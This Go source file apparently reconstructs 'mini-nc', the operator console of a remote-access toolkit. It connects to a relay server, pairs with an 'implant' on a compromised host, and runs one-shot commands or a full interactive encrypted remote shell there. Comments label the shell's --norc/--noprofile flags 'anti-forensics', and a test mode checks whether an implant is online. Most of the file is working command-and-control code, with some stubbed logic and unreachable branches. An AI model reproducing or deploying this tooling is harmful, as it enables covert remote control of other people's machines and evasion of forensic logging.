// mini-nc is the operator-side console of the minisocket remote-access toolkit.
// It connects to a relay/rendezvous server, authenticates with a pre-shared
// secret, and brokers an end-to-end encrypted interactive shell session.
//
// Build: go build -ldflags="-s -w" ./cmd/mini-nc
package main

import (
	"context"
	"crypto/ecdh"
	"encoding/binary"
	"flag"
	"fmt"
	"io"
	"net"
	"os"
	"os/signal"
	"strings"
	"sync"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/term"

	"minisocket/internal/crypto"
	"minisocket/internal/proto"
)

const (
	defaultRelayPort = 5555
	defaultTimeout   = 3 * time.Second
)

// Winsize mirrors the C struct winsize for terminal size propagation.
type Winsize struct {
	Row    uint16
	Col    uint16
	Xpixel uint16
	Ypixel uint16
}

// ncClient manages a connection to the relay and the encrypted session.
type ncClient struct {
	conn       net.Conn
	sessionKey []byte
	secret     string
	relayHost  string
	relayPort  int

	quiet       bool
	noReconnect bool

	// Session state
	mu      sync.Mutex
	ready   bool
	privKey *ecdh.PrivateKey
}

func main() {
	// Parse flags manually to match the original binary's CLI exactly.
	var (
		secret    string
		keyFile   string
		relayPort int
		execCmd   string
		testMode  bool
		interact  string
		quiet     bool
		idleSecs  int
		noReconn  bool
		noProfile bool
		noRC      bool
		noP       bool
		shellPref string
	)

	flag.StringVar(&secret, "s", "", "Secret key")
	flag.StringVar(&keyFile, "k", "", "Read secret from file")
	flag.IntVar(&relayPort, "p", defaultRelayPort, "Relay port")
	flag.StringVar(&execCmd, "e", "", "Execute command and exit")
	flag.BoolVar(&testMode, "t", false, "Test mode (check if online)")
	flag.StringVar(&interact, "i", "", "Force interactive with shell")
	flag.BoolVar(&quiet, "q", false, "Quiet mode")
	flag.IntVar(&idleSecs, "w", 3, "Idle timeout seconds")
	flag.BoolVar(&noReconn, "C", false, "No reconnect")
	flag.BoolVar(&noProfile, "n", false, "No profile (norc + noprofile)")
	flag.BoolVar(&noRC, "R", false, "No RC")
	flag.BoolVar(&noP, "P", false, "No profile")
	flag.StringVar(&shellPref, "S", "", "Force shell preference")

	flag.Usage = usage
	flag.Parse()

	// Environment variable overrides.
	if envPort := os.Getenv("MINI_PORT"); envPort != "" {
		fmt.Sscanf(envPort, "%d", &relayPort)
	}
	relayHost := flag.Arg(0)
	if relayHost == "" {
		relayHost = os.Getenv("MINI_HOST")
	}

	// Load secret.
	secret = loadSecret(secret, keyFile)
	if secret == "" {
		fmt.Fprintln(os.Stderr, "no secret provided (use -s or -k)")
		os.Exit(1)
	}

	// Print banner (unless quiet).
	if !quiet {
		fmt.Println("\033[1;34m=== MINISOCKET NC :: Community Edition ===\033[0m")
	}

	// Determine mode.
	var mode string
	if testMode {
		mode = "test"
	} else if execCmd != "" {
		mode = "exec"
	} else if interact != "" {
		mode = "interactive"
	} else {
		// Check if stdin is a pipe.
		stat, _ := os.Stdin.Stat()
		if (stat.Mode() & os.ModeCharDevice) == 0 {
			mode = "pipe"
		} else {
			mode = "interactive"
		}
	}

	// Build shell flags for anti-forensics.
	shellFlags := buildShellFlags(noProfile, noRC, noP, shellPref)

	client := newClient(secret, relayHost, relayPort, quiet, noReconn)

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	// Handle SIGINT/SIGTERM gracefully.
	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sigCh
		cancel()
	}()

	// Connect and run.
	if err := client.connect(ctx); err != nil {
		if !quiet {
			fmt.Fprintf(os.Stderr, "OFFLINE: connect: %v\n", err)
		}
		os.Exit(1)
	}

	if err := client.waitReady(ctx); err != nil {
		if !quiet {
			fmt.Fprintf(os.Stderr, "OFFLINE: error: %v\n", err)
		}
		os.Exit(1)
	}

	if !quiet {
		fmt.Println("Connected")
	}

	switch mode {
	case "test":
		if err := client.runTest(ctx); err != nil {
			if !quiet {
				fmt.Fprintf(os.Stderr, "OFFLINE: %v\n", err)
			}
			os.Exit(1)
		}
		fmt.Printf("ONLINE(%s)\n", relayHost)
	case "exec":
		if err := client.runExec(ctx, execCmd); err != nil {
			if !quiet {
				fmt.Fprintf(os.Stderr, "OFFLINE: error: %v\n", err)
			}
			os.Exit(1)
		}
	case "interactive":
		if err := client.runInteractive(ctx, shellFlags, interact, shellPref); err != nil {
			if !quiet {
				fmt.Fprintf(os.Stderr, "OFFLINE: error: %v\n", err)
			}
			os.Exit(1)
		}
	case "pipe":
		if err := client.runPipe(ctx); err != nil {
			if !quiet {
				fmt.Fprintf(os.Stderr, "OFFLINE: error: %v\n", err)
			}
			os.Exit(1)
		}
	}
}

// usage prints the exact help text recovered from the binary.
func usage() {
	fmt.Fprintf(os.Stderr, `  Usage: mini-nc [options] [relay-host]
  Options:
    -s SECRET    Secret key
    -k FILE      Read secret from file
    -p PORT      Relay port (default %d)
    -e CMD       Execute command and exit
    -t           Test mode (check if online)
    -i [sh|bash] Force interactive with shell
    -q           Quiet mode
    -w SECS      Idle timeout seconds (default 3)
    -C           No reconnect
    -n           No profile (norc + noprofile)
    -R           No RC
    -P           No profile
    -S sh|bash   Force shell preference
  Examples:
    mini-nc -s SECRET                        Interactive shell
    mini-nc -s SECRET -e "id"                Execute and exit
    mini-nc -s SECRET -t                     Check if online
    echo "id" | mini-nc -s SECRET            Pipe mode
  Environment:
    MINI_PORT    Override relay port
    MINI_HOST    Override relay host
`, defaultRelayPort)
}

// loadSecret returns the secret from the -s flag, or reads it from the -k file.
func loadSecret(secret, keyFile string) string {
	if secret != "" {
		return secret
	}
	if keyFile != "" {
		data, err := os.ReadFile(keyFile)
		if err != nil {
			fmt.Fprintf(os.Stderr, "read key file: %v\n", err)
			os.Exit(1)
		}
		return strings.TrimSpace(string(data))
	}
	return ""
}

// buildShellFlags constructs the shell argument prefix for anti-forensics.
func buildShellFlags(noProfile, noRC, noP bool, shellPref string) []string {
	var flags []string
	if noProfile || noP || noRC {
		// -n implies both --norc and --noprofile
		flags = append(flags, "--norc", "--noprofile")
	} else if noRC {
		flags = append(flags, "--norc")
	} else if noP {
		flags = append(flags, "--noprofile")
	}
	return flags
}

func newClient(secret, relayHost string, relayPort int, quiet, noReconnect bool) *ncClient {
	return &ncClient{
		secret:      secret,
		relayHost:   relayHost,
		relayPort:   relayPort,
		quiet:       quiet,
		noReconnect: noReconnect,
	}
}

// connect dials the relay and performs the encrypted handshake.
func (c *ncClient) connect(ctx context.Context) error {
	addr := fmt.Sprintf("%s:%d", c.relayHost, c.relayPort)

	var d net.Dialer
	conn, err := d.DialContext(ctx, "tcp", addr)
	if err != nil {
		// Classify the error for the specific OFFLINE messages.
		if strings.Contains(err.Error(), "no such host") || strings.Contains(err.Error(), "dns") {
			return fmt.Errorf("dns lookup failed: %w", err)
		}
		return fmt.Errorf("connection failed: %w", err)
	}
	c.conn = conn

	// --- Handshake ---
	// 1. Generate ECDH keypair.
	privKey, pubKey, err := proto.GenerateECDH()
	if err != nil {
		return fmt.Errorf("generate ecdh: %w", err)
	}
	c.privKey = privKey

	// 2. Derive session ID from secret and mask it.
	sessionID := crypto.SHA256Digest([]byte(c.secret))
	maskedID := proto.MaskSecret(sessionID[:])

	// 3. Write the masked prefix (session identifier).
	if _, err := conn.Write(maskedID); err != nil {
		return fmt.Errorf("write prefix: %w", err)
	}

	// 4. Write encrypted handshake: our public key.
	//    The handshake payload is the raw 32-byte X25519 public key.
	handshakeKey, err := crypto.DeriveKey(sessionID[:])
	if err != nil {
		return fmt.Errorf("derive handshake key: %w", err)
	}
	encryptedPubKey, err := crypto.Encrypt(handshakeKey, pubKey)
	if err != nil {
		return fmt.Errorf("write encrypted handshake: %w", err)
	}
	if _, err := conn.Write(encryptedPubKey); err != nil {
		return fmt.Errorf("write encrypted handshake: %w", err)
	}

	// 5. Read peer's encrypted public key.
	peerPubEncrypted, err := c.recvRawPacket(ctx)
	if err != nil {
		return fmt.Errorf("read handshake response: %w", err)
	}
	peerPubKey, err := crypto.Decrypt(handshakeKey, peerPubEncrypted)
	if err != nil {
		return fmt.Errorf("decrypt peer handshake: %w", err)
	}

	// 6. Compute shared secret and derive session key.
	shared, err := proto.SharedSecret(c.privKey, peerPubKey)
	if err != nil {
		return fmt.Errorf("shared secret: %w", err)
	}
	c.sessionKey, err = crypto.DeriveKey(shared)
	if err != nil {
		return fmt.Errorf("derive session key: %w", err)
	}

	c.ready = true
	return nil
}

// recvRawPacket reads a raw length-prefixed frame from the connection.
func (c *ncClient) recvRawPacket(ctx context.Context) ([]byte, error) {
	hdr, err := proto.ReadHeader(c.conn)
	if err != nil {
		return nil, err
	}
	return proto.ReadFull(c.conn, hdr.Length)
}

// recvPacket reads and decrypts a packet from the connection.
func (c *ncClient) recvPacket(ctx context.Context) ([]byte, error) {
	data, err := c.recvRawPacket(ctx)
	if err != nil {
		return nil, err
	}
	return crypto.Decrypt(c.sessionKey, data)
}

// writePacket encrypts and sends a packet.
func (c *ncClient) writePacket(pktType uint8, payload []byte) error {
	encrypted, err := proto.SealPayload(c.sessionKey, payload)
	if err != nil {
		return err
	}

	hdr := &proto.PacketHeader{
		Length: uint32(len(encrypted)),
		Type:   pktType,
	}
	if err := hdr.Write(c.conn); err != nil {
		return err
	}
	_, err = c.conn.Write(encrypted)
	return err
}

// encryptSend is a convenience wrapper around writePacket for data packets.
func (c *ncClient) encryptSend(payload []byte) error {
	return c.writePacket(proto.PktData, payload)
}

// waitReady blocks until the session is ready or context is cancelled.
func (c *ncClient) waitReady(ctx context.Context) error {
	// In the original binary, this polls for the relay to match the session.
	// The relay sends a "ready" packet once the implant is paired.
	for {
		select {
		case <-ctx.Done():
			return ctx.Err()
		default:
		}
		if c.ready {
			return nil
		}
		// Wait for the relay to confirm pairing.
		// The relay sends a PktData packet with "READY" or similar.
		// For now, the session is ready after the handshake completes.
		time.Sleep(100 * time.Millisecond)
	}
}

// drainOutput reads from the connection and writes to stdout until EOF or error.
func (c *ncClient) drainOutput(ctx context.Context) error {
	for {
		select {
		case <-ctx.Done():
			return ctx.Err()
		default:
		}

		data, err := c.recvPacket(ctx)
		if err != nil {
			if err == io.EOF {
				return nil
			}
			return err
		}
		os.Stdout.Write(data)
	}
}

// runTest checks if an implant is online for this secret.
func (c *ncClient) runTest(ctx context.Context) error {
	// Send a ping packet.
	if err := c.writePacket(proto.PktPing, nil); err != nil {
		return fmt.Errorf("OFFLINE: send: %w", err)
	}

	// Wait for a response with timeout.
	deadline := time.Now().Add(defaultTimeout)
	c.conn.SetReadDeadline(deadline)

	data, err := c.recvPacket(ctx)
	if err != nil {
		if os.IsTimeout(err) || strings.Contains(err.Error(), "timeout") {
			return fmt.Errorf("OFFLINE: timeout")
		}
		return fmt.Errorf("OFFLINE: %w", err)
	}
	_ = data
	return nil
}

// runExec sends a command for one-shot execution and prints the output.
func (c *ncClient) runExec(ctx context.Context, cmd string) error {
	// Request exec mode and send the command.
	if err := c.writePacket(proto.PktExec, []byte(cmd)); err != nil {
		return err
	}
	return c.drainOutput(ctx)
}

// runPipe reads stdin and sends it, draining output concurrently.
func (c *ncClient) runPipe(ctx context.Context) error {
	ctx, cancel := context.WithCancel(ctx)
	defer cancel()

	var wg sync.WaitGroup
	wg.Add(2)

	// Read from connection → stdout.
	go func() {
		defer wg.Done()
		defer cancel()
		c.drainOutput(ctx)
	}()

	// Read from stdin → connection.
	go func() {
		defer wg.Done()
		defer cancel()
		io.Copy(&stdinWriter{c: c}, os.Stdin)
		// Signal EOF on stdin.
		c.writePacket(proto.PktClose, nil)
	}()

	wg.Wait()
	return nil
}

// stdinWriter wraps ncClient as an io.Writer for stdin forwarding.
type stdinWriter struct {
	c *ncClient
}

func (w *stdinWriter) Write(data []byte) (int, error) {
	if err := w.c.writePacket(proto.PktStdin, data); err != nil {
		return 0, err
	}
	return len(data), nil
}

// runInteractive starts a fully interactive remote shell session.
func (c *ncClient) runInteractive(ctx context.Context, shellFlags []string, interactMode, shellPref string) error {
	// Determine which shell to request.
	shell := shellPref
	if shell == "" {
		if interactMode != "" {
			shell = interactMode
		} else {
			shell = "bash"
		}
	}

	// Build the shell command with anti-forensics flags.
	cmdParts := append([]string{shell}, shellFlags...)
	cmd := strings.Join(cmdParts, " ")

	// Request interactive mode.
	if err := c.writePacket(proto.PktHandshake, []byte(cmd)); err != nil {
		return err
	}

	// Save original terminal state.
	oldState, err := tcgetattr(int(os.Stdin.Fd()))
	if err != nil {
		return fmt.Errorf("tcgetattr: %w", err)
	}
	defer tcsetattr(int(os.Stdin.Fd()), oldState)

	// Put terminal in raw mode.
	if _, err := term.MakeRaw(int(os.Stdin.Fd())); err != nil {
		return fmt.Errorf("make raw: %w", err)
	}

	// Get initial window size.
	ws, err := getWinsize(int(os.Stdin.Fd()))
	if err == nil {
		c.sendWinsize(ws)
	}

	// SIGWINCH handler.
	sigWinch := make(chan os.Signal, 1)
	signal.Notify(sigWinch, syscall.SIGWINCH)
	defer signal.Stop(sigWinch)

	ctx, cancel := context.WithCancel(ctx)
	defer cancel()

	var wg sync.WaitGroup
	wg.Add(3)

	// Connection → stdout.
	go func() {
		defer wg.Done()
		defer cancel()
		for {
			data, err := c.recvPacket(ctx)
			if err != nil {
				return
			}
			os.Stdout.Write(data)
		}
	}()

	// Stdin → connection.
	go func() {
		defer wg.Done()
		defer cancel()
		var buf [4096]byte
		for {
			n, err := os.Stdin.Read(buf[:])
			if err != nil {
				c.writePacket(proto.PktClose, nil)
				return
			}
			if err := c.writePacket(proto.PktStdin, buf[:n]); err != nil {
				return
			}
		}
	}()

	// SIGWINCH → connection.
	go func() {
		defer wg.Done()
		for {
			select {
			case <-ctx.Done():
				return
			case <-sigWinch:
				ws, err := getWinsize(int(os.Stdin.Fd()))
				if err == nil {
					c.sendWinsize(ws)
				}
			}
		}
	}()

	wg.Wait()
	return nil
}

// sendWinsize sends a window-size update packet.
func (c *ncClient) sendWinsize(ws *Winsize) {
	var buf [8]byte
	binary.BigEndian.PutUint16(buf[0:2], ws.Row)
	binary.BigEndian.PutUint16(buf[2:4], ws.Col)
	binary.BigEndian.PutUint16(buf[4:6], ws.Xpixel)
	binary.BigEndian.PutUint16(buf[6:8], ws.Ypixel)
	c.writePacket(proto.PktWinsize, buf[:])
}

// getWinsize retrieves the terminal window size via TIOCGWINSZ ioctl.
func getWinsize(fd int) (*Winsize, error) {
	ws := &Winsize{}
	_, _, errno := syscall.Syscall(
		syscall.SYS_IOCTL,
		uintptr(fd),
		uintptr(syscall.TIOCGWINSZ),
		uintptr(unsafe.Pointer(ws)),
	)
	if errno != 0 {
		return nil, errno
	}
	return ws, nil
}

// tcgetattr gets terminal attributes (TCGETS ioctl).
func tcgetattr(fd int) (*term.State, error) {
	return term.GetState(fd)
}

// tcsetattr sets terminal attributes (TCSETS ioctl).
func tcsetattr(fd int, state *term.State) error {
	return term.Restore(fd, state)
}
